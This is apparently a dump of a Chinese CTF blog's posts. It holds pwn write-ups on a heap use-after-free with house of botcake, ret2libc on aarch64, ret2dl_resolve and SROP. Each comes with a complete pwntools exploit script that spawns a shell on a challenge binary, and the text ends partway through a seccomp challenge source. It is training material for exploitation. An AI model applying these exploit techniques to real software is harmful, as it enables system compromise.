会同时存放至 MSG_LIST 和 LOCAL_MSGLIST_ENTR两个地方共用了同一个 message 指针漏洞点在于 delete：delete 用户时，程序会释放和清空 MSG_LIST 中的 entry 和 message 指针 ，但没有清空LOCAL_MSGLIST_ENTRY的 message 指针。\n因此：首先发送一条 message 给自己，然后删除当前用户，就能使用 read 功能读取 LOCAL_MSGLIST_ENTRY 中已释放 message 指针上的数据，从而泄漏内存地址。\n此外。delete中存在doublefree漏洞。\n这里选择用UAF泄露地址\n打house of botcake 劫持free hook\n#!/usr/bin/env python3from pwn import *import warningswarnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)context(os =&quot;Linux&quot;,arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)#p = remote(&quot;101.200.122.251&quot;, 14509)p = process(&#x27;./chatting&#x27;)libc = ELF(&quot;./libc-2.27.so&quot;)def add(n):    p.sendlineafter(&quot;add&quot;, &quot; exit): &quot;)    p.sendlineafter(n, &quot;Enter new username: &quot;)    def delete(n):    p.sendlineafter(&quot;delete&quot;, &quot; exit): &quot;)    p.sendlineafter(n, &quot;Enter username to delete: &quot;)    def message(to, ctx):    p.sendlineafter(&quot;message&quot;, &quot; exit): &quot;)    p.sendlineafter(to, &quot;To:&quot;)    p.sendlineafter(len(ctx), &quot;Message size:&quot;)    p.sendlineafter(ctx, &quot;Content:&quot;)def listuser():    p.sendlineafter(&quot;listuser&quot;, &quot; exit): &quot;)    def read():    p.sendlineafter(&quot;read&quot;, &quot; exit): &quot;)def switch(n):    p.sendlineafter(&quot;switch&quot;, &quot; exit): &quot;)    p.sendlineafter(n, &quot;Enter username to switch to: &quot;)#  UAF p.sendline(&quot;str1k3&quot;)add(&quot;aaaa&quot;)add(&quot;bbbb&quot;)message(&quot;str1k3&quot;, &quot;a&quot;*0x500)message(&quot;xxxx&quot;, &quot;b&quot;*0x500)delete(&quot;str1k3&quot;) # BUG1message(&quot;xxxx&quot;, &quot;c&quot;*0x800)read()p.recvuntil(&quot;str1k3 -&gt; str1k3: &quot;)libc_base = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x3ec0d0success(&quot;libc_base: &quot;+ hex(libc_base))#  house of botcakeadd(&quot;A&quot;*0x80)add(&quot;B&quot;*0x80)add(&quot;C&quot;*0x80)add(&quot;D&quot;*0x80)add(&quot;E&quot;*0x80)add(&quot;F&quot;*0x80)switch(&quot;F&quot;*0x80)for i in range(7):    message(&quot;F&quot;*0x80, str(i)*0x80) # 事先创建大量 0x90 空闲堆块保护 unsorted bin chunkread()switch(&quot;A&quot;*0x80)message(&quot;A&quot;*0x80, &quot;a&quot;*0x100)switch(&quot;B&quot;*0x80)message(&quot;B&quot;*0x80, &quot;b&quot;*0x100)switch(&quot;C&quot;*0x80)for i in range(7):    message(&quot;C&quot;*0x80, str(i)*0x100) # 填充 tcache binread()switch(&quot;A&quot;*0x80)read()switch(&quot;B&quot;*0x80)read()switch(&quot;bbbb&quot;)message(&quot;xxxx&quot;, &quot;a&quot;*0x100)switch(&quot;B&quot;*0x80) read() # BUG2，Double free，chunk 同时位于 unosorted bin 和 tcache# free_hookswitch(&quot;bbbb&quot;)pp = b&#x27;A&#x27;*0x100+flat([0, 0x111, libc_base+0x3ed8e0])message(&quot;xxxx&quot;, pp.ljust(0x200)) # 篡改 tcache chunk fd 为 free_hookswitch(&quot;D&quot;*0x80)message(&quot;D&quot;*0x80, b&quot;/bin/sh&quot;.ljust(0x100, b&#x27;\\x00&#x27;))message(&quot;bbbb&quot;, (p64(0)+p64(libc.symbols[&quot;system&quot;])).ljust(0x100, b&#x27;\\x00&#x27;)) # 覆盖 free_hook 为 systemread() # 释放 &quot;/bin/sh&quot;p.interactive()","categories":["wp"],"tags":["wp"]},{"title":"ret2libc_in_aarch64","url":"/2024/04/12/ret2libc-in-arm/","content":"[美团CTF2022 ret2libc_aarch64]*附件下载只开了NX（qemu环境随机化就算开了也&#x3D;没开）mainleak函数，输入puts_got_addr能够泄露puts地址这里要注意的是，aarch64中libc地址存在&#x2F;x00截断可以只泄露低位，再加回去\nputs_got =elf.got[&#x27;puts&#x27;]p.recvuntil(&quot;&gt;&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;sensible&gt;&gt;\\n&quot;)p.send(p64(puts_got))puts_addr = u64(p.recv(3).ljust(8, b&#x27;\\x00&#x27;))+ 0x4000000000libc_base = puts_addr   - libc.sym[&#x27;puts&#x27;]success(&quot;libc_base : %s&quot;,libc_base)\n\noverflow里有一次溢出给了libc，可以打ret2libc。\nROPgadget发现elf文件内没有什么可以用的gadget，只能去libc里找了，往ldr x0上找最后找到可以用这个\n#0x0000000000063e5c : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret\n这个gadget会把sp+0x18位置的值赋值给x0先打一半泄露地址\n[+] puts_addr : 0x40008ab928[+] libc_base : 0x4000846000[+] gadget : 0x40008a9e5c\n然后断点下到gadget，高亮就是需要传入system的地方(地址)所以ropchain如下\npayload = b&#x27;a&#x27;*128 +b&#x27;b&#x27;*8 + p64(gadget) + p64(0)*3 + p64(system) + p64(0) + p64(binsh)\n\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;aarch64&#x27;, log_level=&#x27;debug&#x27;)#socat tcp-l:10002,fork exec:&quot;qemu-aarch64 -g 2345 -L /usr/aarch64-linux-gnu  ./pwn&quot;;reuseaddr#p = process([&quot;qemu-aarch64&quot;,&quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])p = process([&quot;qemu-aarch64&quot;,&quot;-g&quot;,&quot;2345&quot;,&quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])#p = remote(&quot;127.0.0.1&quot;,10002)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc.so.6&quot;)puts_got =elf.got[&#x27;puts&#x27;]p.sendlineafter(b&quot;&gt;&quot;, &quot;1&quot;)p.sendafter(&quot;sensible&gt;&gt;\\n&quot;, p64(puts_got))p.send(p64(puts_got))puts_addr = u64(p.recv(3).ljust(8, b&#x27;\\x00&#x27;))+ 0x4000000000success(&quot;puts_addr : %s&quot;,hex(puts_addr))libc_base = puts_addr   - libc.sym[&#x27;puts&#x27;]success(&quot;libc_base : %s&quot;,hex(libc_base))system = libc_base + libc.sym[&#x27;system&#x27;]binsh = libc_base + (next(libc.search(b&#x27;/bin/sh&#x27;)))#0x0000000000063e5c : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; retgadget = libc_base + 0x63e5csuccess(&quot;gadget : %s&quot;,gadget)p.sendlineafter(b&quot;&gt;&quot;, &quot;2&quot;)pause()payload = b&#x27;a&#x27;*128 +b&#x27;b&#x27;*8 + p64(gadget) + p64(0)*3 + p64(system) + p64(0) + p64(binsh)p.sendlineafter(&quot;sensible&gt;&gt;&quot;, payload)p.interactive()\n"},{"title":"ret2dl_resolve","url":"/2023/12/06/ret2dl-resolve/","content":"适用于无法leak信息的栈溢出动态装载器负贵将二进制文件及依赖库加载到内存，该过程包含了对导入符号（函数和全局变量）的解析。每个符号都是一个Elf_Sym结构体的实例，这些符号又共同组成了.dynsym段。Elf_Sym结构体如下所示。\n/*Symbol table entry.*/typedef struct&#123;    Elf32_Word      st name;/*Symbol name (string tbl index)*/    Elf32_Addr      st_value;/*Symbol value*/    Elf32_Word      st_size;/*Symbol size*/    unsigned char   st info;/*Symbol type and binding */    unsigned char   st_other;/*Symbol visibility*/    Elf32_Section   st shndx;/*Section index*/&#125;Elf32_Sym;/*How to extract and insert information held in the st info field.*/#define ELF32_ST_BIND(val)      (((unsigned char)(val))&gt;&gt;4)#define ELF32_ST_TYPE(val)      ((va1)&amp;0xf)#define ELF32_ST_INFO(bind,type)((bind) &lt;&lt; 4)+((type) &amp;0xf)\n其中st_name域是相对于.dynstr段的偏移，保存符号名字符串；st_value域是当符号被导出时用于存放虚拟地址的，不导出时则为NULL。\n导入符号的解析需要进行重定位，每个重定位项都是一个ELF_Rel结构体的实例这些项又共同组成了.rl.plt段（用于导入函数）和.rel.dyn段（用于导入全局变量）。Elf_Rel结构体如下所示。\n/*Relocation table entry without addend (in section of type SHT_REL).*/typedef struct&#123;    Elf32_Addr r_offset;/*Address*/    Elf32_Word r_info;/*Relocation type and symbol index*/&#125; Elf32_Rel;/*How to extract and insert information held in the r info field.*/#define ELF32_R_SYM(val)        ((val)&gt;&gt;8)#define ELF32_R_TYPE(val)       ((val)&amp; Oxff)#define ELF32_R_INFO(sym,type)  (((sym)&lt;&lt;8)((type)&amp;0xff))\n其中r_offset.域用于保存解析后的符号地址写入内存的位置（绝对地址），rinfo域的高位3个字节用于标识该符号在.dynsym段中的位置（无符号下标）。\n因此，当程序导入一个函数时，动态链接器会同时在.dynstr段中添加一个函数名字符串，在.dynsym段中添加一个指向函数名字符串的EIf_Sym,在.rel.plt段中添加一个指向EIf_Sym的Elf_Rel。最后，这些Elf_Rel的r_offset域又构成了GOT表，保存在.got.plt段中。由于引入了延迟绑定机制，符号的解析只有在第一次使用的时候才进行，该过程是通过PLT表进行的。每个导入函数都在PLT表中有一个条目，其第1条指令无条件跳转到对应G0T条目保存的地址处。而每个GOT条目在初始化时都默认指向对应PLT条目的第2条指令的位置，相当于又跳回来了。此时继续执行PLT的后两条指令，先将导入函数的标识(Elf_Rel在.rel.plt段中的偏移)压栈，然后跳转到PLT0执行。PLT0包含两条指令，先将GOT[1]的值（一个link_map对象的地址）压栈，然后跳转到GOT[2]保存到地址处也就是_dl_runtime_resolve()函数。函数参数link_map_obj用于获取解析导入函数所需的信息，参数reloc_.indox则标识了解析哪一个导入函数。解析完成后，相应的GOT条目会被修改为正确的函数地址，此后程序再调用该函数时就不需要再次进行解析了。\n在i386下，_dl_runtime_resolve()由汇编实现，如下\n其中，_dl_fixup()函数在&#x2F;elf&#x2F;dl-runtime.c中实现，用于解析导入函数的真实地址，并改写GOT,如下注意，这里是glibc2.31的实现\nDL_FIXUP_VALUE_TYPEattribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS\t   ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif\t   struct link_map *l, ElfW(Word) reloc_arg)&#123;  const ElfW(Sym) *const symtab    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);  const PLTREL *const reloc    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  const ElfW(Sym) *refsym = sym;  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);//对应got表地址  lookup_t result;  DL_FIXUP_VALUE_TYPE value;  /* Sanity check that we&#x27;re really looking at a PLT relocation.  */  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);//检查   /* Look up the target symbol.  If the normal lookup rules are not      used don&#x27;t look in the global scope.  */  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)    &#123;      const struct r_found_version *version = NULL;      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)\t&#123;\t  const ElfW(Half) *vernum =\t    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);\t  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;\t  version = &amp;l-&gt;l_versions[ndx];\t  if (version-&gt;hash == 0)\t    version = NULL;\t&#125;      /* We need to keep the scope around so do some locking.  This is\t not necessary for objects which cannot be unloaded or when\t we are not using any threads (yet).  */      int flags = DL_LOOKUP_ADD_DEPENDENCY;      if (!RTLD_SINGLE_THREAD_P)\t&#123;\t  THREAD_GSCOPE_SET_FLAG ();\t  flags |= DL_LOOKUP_GSCOPE_LOCK;\t&#125;#ifdef RTLD_ENABLE_FOREIGN_CALL      RTLD_ENABLE_FOREIGN_CALL;#endif      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,\t\t\t\t    version, ELF_RTYPE_CLASS_PLT, flags, NULL);//找到对应libc，返回指向libc_base的指针      /* We are done with the global scope.  */      if (!RTLD_SINGLE_THREAD_P)\tTHREAD_GSCOPE_RESET_FLAG ();#ifdef RTLD_FINALIZE_FOREIGN_CALL      RTLD_FINALIZE_FOREIGN_CALL;#endif      /* Currently result contains the base load address (or link map)\t of the object that defines sym.  Now add in the symbol\t offset.  */      value = DL_FIXUP_MAKE_VALUE (result,\t\t\t\t   SYMBOL_ADDRESS (result, sym, false));//获得函数真实地址    &#125;  else    &#123;      /* We already found the symbol.  The module (and therefore its load\t address) is also known.  */      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true));      result = l;    &#125;  /* And now perhaps the relocation addend.  */  value = elf_machine_plt_value (l, reloc, value);  if (sym != NULL      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  /* Finally, fix up the plt itself.  */  if (__glibc_unlikely (GLRO(dl_bind_not)))    return value;  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value); //写入got表&#125;\n\n此外，由于RELRO保护机制会影响延迟绑定，因此也会影响ret2dl-resolve:Partial RELRO:包括.dynamic段在内的一些段会被标识为只读。Full RELRO:在Partial RELRO的基础上，禁用延迟绑定，即所有的导入符号在加载时就被解析，.got.pt段被完全初始化为目标函数的地址，并标记为只读。\n(1)关闭RELRO保护，使.dynamic段可写时：由于动态装载器是从.dynamic.段的DT_STRTAB条目中来获取.dynstr段的地址，而DT_STRTAB的位置是己知的，且默认情况下可写，所以攻击者能够改写DT_STRTAB的内容，欺骗动态装载器，使它以为.dynstr.段在.bSs上，同时在那里伪造一个假的字符串表。当动态装载器尝试解析printf()时就会使用不同的基地址来寻找函数名，最终执行的是execve().(2)开启Partial RELRO保护，使.dynamic段不可写时：我们知道_dl_runtime_resolve()的第二个参数reloc_.index对应Elf_Rel在.rel.plt段中的偏移，动态装载器将其加上.rel.plt的基地址来得到目标Elf Rel的内存地址。然而，当这个内存地址超出了.rel.plt段，并最终落在.bss段中时，攻击者就可以在那里伪造一个Elf_Rel,使r_offset的值是一个可写的内存地址来将解析后的函数地址写在那里。同理，使rifo的值是一个能够将动态装载器导向到攻击者控制内存的下标，指向一个位于它后面的Elf_Sym,而Elf_Sym中的st_name指向它后面的函数名字符串。\n直接在题上复现过程[强网杯2021 no_output]checksec在程序运行前（执行第一次read前） 断点下到的位置就是read@plt,顺带可以看到dl_runtime_resolve的入口接下来走逆向部分这里打开了flag，同时将unk_804C080存在全局变量result。\nv3 = &quot;tell me some thing&quot;;read(0, buf, 0x30u);v3 = &quot;Tell me your name:\\n&quot;;read(0, src, 0x20u);  sub_80493EC(src);  strcpy(dest, src);  // strcpy 被 &#x27;\\x00&#x27; 截断，而且还会往 dest 后面补一个 &#x27;\\x00&#x27;v3 = &quot;now give you the flag\\n&quot;;read(unk_804C080, src, 0x10u);// off_804C034 存放的是字符串 &quot;hello_boy\\x00&quot;// check() 是字符串比较，两个字符串相同返回 0result = check(src, off_804C034); if ( !result )  result = sub_8049269();\n这里的strcpy存在一个类似于off-by-null的漏洞，会把unk_804C080覆盖为\\x00,因为dest后面就是unk_804C080，如下：导致后一个read实际执行read(unk_804C080,src,0x10),因此可以通过直接输入”hello_boy\\x00”来进入sub_8049269，如下此处 signal() 函数的作用在于：当发生除法异常时，执行 sub_8049236 函数，sub_8049236 函数中便是一个栈溢出了。由于 v1 不能为 0，我们令 v2 &#x3D; -2147483648, v1 &#x3D; -1，此时会发生除法溢出（int 类型的数据范围为：-2147483648 ~ 2147483647）。由于没有输出函数，用 ret2dlresolve 的方式来利用这个栈溢出漏洞。存两个模板吧ezdl\nfrom pwn import *context.log_level = &quot;debug&quot;elf = ELF(&#x27;./no_output&#x27;)p = process(&#x27;./no_output&#x27;)rop = ROP(&#x27;./no_output&#x27;)# 这里很奇怪，好像放别的字符串都不行...p.send(b&#x27;\\x00&#x27;)#gdb.attach(p)p.send(b&#x27;a&#x27;*0x20)p.send(b&#x27;hello_boy\\x00&#x27;)p.sendline(b&#x27;-2147483648&#x27;)p.sendline(b&#x27;-1&#x27;)dlresolve = Ret2dlresolvePayload(elf, symbol=&quot;system&quot;, args=[&quot;/bin/sh&quot;])print(dlresolve)rop.read(0, dlresolve.data_addr)rop.ret2dlresolve(dlresolve)raw_rop = rop.chain()info(rop.dump())# fit() 函数会自动填充，76 是溢出点，0x100 是 read() 函数的长度p.sendline(fit(&#123;76:raw_rop, 0x100:dlresolve.payload&#125;))p.interactive()\ndetail\nfrom pwn import *from pwn import p32challenge = &quot;./no_output&quot;context(arch = &quot;i386&quot;,log_level = &quot;debug&quot;,os = &quot;linux&quot;)p = process(&#x27;./no_output&#x27;)#libc = ELF(&quot;./libc.so.6&quot;)#r = remote(&quot;39.105.138.97&quot;,1234)elf = ELF(&#x27;./no_output&#x27;)leave_ret = 0x080491a5bss_stage = elf.bss() + 0x200success(&quot;bss : %s&quot;,hex(elf.bss()))fake_ebp = bss_stageoffset = 0x4c-8+8#read_plt  = elf.plt[&quot;read&quot;]#gdb.attach(r)p1 = b&quot;\\x00&quot; * 0x30p.send(p1)sleep(1)p.send(b&#x27;A&#x27; * 0x20)str1 = b&#x27;hello_boy&#x27;str1 = str1.ljust(0x10,b&#x27;\\x00&#x27;)p.send(str1)p.sendline(b&quot;-2147483648&quot;)p.sendline(b&quot;-1&quot;)sleep(0.1)read_plt = 0x80490C4ppp_ret = 0x08049581 # ROPgadget --binary test --only &quot;pop|ret&quot;pop_ebp_ret = 0x08049583leave_ret = 0x080491a5 # ROPgadget --binary test --only &quot;leave|ret&quot;stack_size = 0x800bss_addr = elf.bss() # readelf -S test | grep &quot;.bss&quot;base_stage = bss_addr + stack_sizepayload = flat(b&#x27;A&#x27; * offset, p32(read_plt), p32(ppp_ret), p32(0), p32(base_stage), p32(100), p32(pop_ebp_ret), p32(base_stage), p32(leave_ret))p.send(payload)cmd = &quot;/bin/sh&quot;plt_0 = 0x8049030 # objdump -d -j .plt testrel_plt = 0x8048414 # objdump -s -j .rel.plt testdynsym = 0x08048248  # readelf -S teststrtab = 0x08048318 #readelf -S testfake_write_addr = base_stage + 28fake_arg = fake_write_addr - rel_pltr_offset = elf.got[&#x27;read&#x27;]align = 0x10 - ((base_stage + 36 - dynsym) % 16) fake_sym_addr = base_stage + 36 + align # 填充地址使其与dynsym的偏移16字节对齐（即两者的差值能被16整除），因为结构体sym的大小都是16字节r_info = ((((fake_sym_addr - dynsym)//16) &lt;&lt; 8) | 0x7) # 使其最低位为7，通过检测fake_write_rel = flat(p32(r_offset), p32(r_info))fake_write_str_addr = base_stage + 36 + align + 0x10fake_name = fake_write_str_addr - strtabfake_sym = flat(p32(fake_name),p32(0),p32(0),p32(0x12))fake_write_str = &#x27;system\\x00&#x27;payload2 = flat(b&#x27;AAAA&#x27;, p32(plt_0), fake_arg, p32(ppp_ret), p32(base_stage + 80), p32(base_stage + 80), p32(len(cmd)), fake_write_rel # base_stage + 28, b&#x27;A&#x27; * align # 用于对齐的填充, fake_sym # base_stage + 36 + align, fake_write_str # 伪造出的字符串)payload2 += flat(&#x27;A&#x27; * (80-len(payload2)) , cmd + &#x27;\\x00&#x27;)payload2 += flat(&#x27;A&#x27; * (100-len(payload2)))#pause()p.send(payload2)p.interactive()\n","categories":["stack"],"tags":["rop"]},{"title":"初探srop","url":"/2023/08/13/srop/","content":"signal 机制signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。\n┌──(str1d3r㉿str1k3Gwindows)-[~]└─$ kill -l 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR111) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+338) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+843) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+1348) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-1253) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-758) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-263) SIGRTMAX-1  64) SIGRTMAX\n内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。\n内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontextx86\nstruct sigcontext&#123;  unsigned short gs, __gsh;  unsigned short fs, __fsh;  unsigned short es, __esh;  unsigned short ds, __dsh;  unsigned long edi;  unsigned long esi;  unsigned long ebp;  unsigned long esp;  unsigned long ebx;  unsigned long edx;  unsigned long ecx;  unsigned long eax;  unsigned long trapno;  unsigned long err;  unsigned long eip;  unsigned short cs, __csh;  unsigned long eflags;  unsigned long esp_at_signal;  unsigned short ss, __ssh;  struct _fpstate * fpstate;  unsigned long oldmask;  unsigned long cr2;&#125;;\nx64\nstruct _fpstate&#123;  /* FPU environment matching the 64-bit FXSAVE layout.  */  __uint16_t        cwd;  __uint16_t        swd;  __uint16_t        ftw;  __uint16_t        fop;  __uint64_t        rip;  __uint64_t        rdp;  __uint32_t        mxcsr;  __uint32_t        mxcr_mask;  struct _fpxreg    _st[8];  struct _xmmreg    _xmm[16];  __uint32_t        padding[24];&#125;;struct sigcontext&#123;  __uint64_t r8;  __uint64_t r9;  __uint64_t r10;  __uint64_t r11;  __uint64_t r12;  __uint64_t r13;  __uint64_t r14;  __uint64_t r15;  __uint64_t rdi;  __uint64_t rsi;  __uint64_t rbp;  __uint64_t rbx;  __uint64_t rdx;  __uint64_t rax;  __uint64_t rcx;  __uint64_t rsp;  __uint64_t rip;  __uint64_t eflags;  unsigned short cs;  unsigned short gs;  unsigned short fs;  unsigned short __pad0;  __uint64_t err;  __uint64_t trapno;  __uint64_t oldmask;  __uint64_t cr2;  __extension__ union    &#123;      struct _fpstate * fpstate;      __uint64_t __fpstate_word;    &#125;;  __uint64_t __reserved1 [8];&#125;;\nsignal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。\n仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：\nSignal Frame 被保存在用户的地址空间中，所以用户是可以读写的。由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。说到这里，其实，SROP 的基本利用原理也就出现了。获取 shell首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。system call chains需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可控制栈指针。把原来 rip 指向的syscall gadget 换成syscall; ret gadget。这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。后续 ¶需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件可以通过栈溢出来控制栈的内容需要知道相应的地址“&#x2F;bin&#x2F;sh”Signal Framesyscallsigreturn需要有够大的空间来塞下整个 sigal frame\n以上介绍来自CTFwikipwntools已集成srop攻击\n[CISCN 2019华南]PWN3 #复现环境ubuntu 20.04\nstr1k3@ubuntu:~/Desktop$ checksec &#x27;/var/run/vmblock-fuse/blockdir/P0SsCP/pwn3&#x27; [*] &#x27;/var/run/vmblock-fuse/blockdir/P0SsCP/pwn3&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n保护没特别的\nsigned __int64 vuln()&#123;  signed __int64 v0; // rax  char buf[16]; // [rsp+0h] [rbp-10h] BYREF  v0 = sys_read(0, buf, 0x400uLL);  return sys_write(1u, buf, 0x30uLL); //打印出栈地址&#125;\n给了gadget\n.text:00000000004004D6                               public gadgets.text:00000000004004D6                               gadgets proc near.text:00000000004004D6                               ; __unwind &#123;.text:00000000004004D6 55                            push    rbp.text:00000000004004D7 48 89 E5                      mov     rbp, rsp.text:00000000004004DA 48 C7 C0 0F 00 00 00          mov     rax, 0Fh.text:00000000004004E1 C3                            retn.text:00000000004004E1.text:00000000004004E1                               gadgets endp ; sp-analysis failed.text:00000000004004E1.text:00000000004004E2                               ; ---------------------------------------------------------------------------.text:00000000004004E2 48 C7 C0 3B 00 00 00          mov     rax, 3Bh ; &#x27;;&#x27;.text:00000000004004E9 C3                            retn.text:00000000004004E9.text:00000000004004E9                               ; ---------------------------------------------------------------------------.text:00000000004004EA 90                            db 90h.text:00000000004004EB                               ; ---------------------------------------------------------------------------.text:00000000004004EB 5D                            pop     rbp.text:00000000004004EC C3                            retn.text:00000000004004EC                               ; &#125; // starts at 4004D6\n有mov rax，0xf,显然进行srop要实现system(“&#x2F;bin&#x2F;sh”)首先我们还需要给rdi赋值bin_sh字符串的地址需要把bin_sh写到栈上 然后利用write函数泄露栈地址\npwndbg&gt; x/40gx 0x7fffffffe3300x7fffffffe330:\t0x6161616161616161*\t0x000000000040050a 0x7fffffffe340:\t0x00007fffffffe360\t0x00000000004005360x7fffffffe350:\t0x00007fffffffe458*\t0x0000000100000000 0x7fffffffe360:\t0x0000000000000000\t0x00007ffff7de80830x7fffffffe370:\t0x00007ffff7ffc620\t0x00007fffffffe4580x7fffffffe380:\t0x0000000100000000\t0x000000000040051d0x7fffffffe390:\t0x0000000000400540\t0xb0a1866950c4d5040x7fffffffe3a0:\t0x00000000004003e0\t0x00007fffffffe4500x7fffffffe3b0:\t0x0000000000000000\t0x00000000000000000x7fffffffe3c0:\t0x4f5e79969624d504\t0x4f5e69d450aad5040x7fffffffe3d0:\t0x0000000000000000\t0x00000000000000000x7fffffffe3e0:\t0x0000000000000000\t0x00000000000000010x7fffffffe3f0:\t0x00007fffffffe458\t0x00007fffffffe4680x7fffffffe400:\t0x00007ffff7ffe190\t0x00000000000000000x7fffffffe410:\t0x0000000000000000\t0x00000000004003e00x7fffffffe420:\t0x00007fffffffe450\t0x00000000000000000x7fffffffe430:\t0x0000000000000000\t0x00000000004004090x7fffffffe440:\t0x00007fffffffe448\t0x000000000000001c0x7fffffffe450:\t0x0000000000000001\t0x00007fffffffe6d40x7fffffffe460:\t0x0000000000000000\t0x00007fffffffe709\n输入的8字节的字母a位于0x7fffffffe330,0x7fffffffe350处有一个0x00007fffffffe458的地址可以泄露\nfrom pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)#p = process(&quot;./pwn3&quot;)p = remote(&quot;node1.anna.nssctf.cn&quot;,28856)elf = ELF(&quot;./pwn3&quot;)syscall = 0x400501syscall_ret = 0x400517gadget = 0x4004DAvuln = 0x4004ED#泄露栈地址p.send(b&#x27;a&#x27;*0x10+p64(vuln))p.recv(0x20)stack = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;)) -0x118print(&quot;stack -&gt; &quot; + hex(stack))#sropframe = SigreturnFrame()frame.rax = 59frame.rdi = stackframe.rip = syscallframe.rsi = 0payload = b&quot;/bin/sh\\x00&quot;*0x2 + p64(gadget) + p64(syscall) + bytes(frame)p.send(payload)p.interactive()\n\n[NepCTF 2023] srop[NepCTF2023]srop给了源码  \n//gcc -no-pie pwn.c -fno-stack-protector -z now -o pwn  -lseccomp#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;syscall.h&gt;#include &lt;seccomp.h&gt;#include &lt;linux/seccomp.h&gt;char buf[0x30]=&quot;welcome to NepCTF2023!\\n&quot;;int seccomp()&#123;    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_KILL);    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);    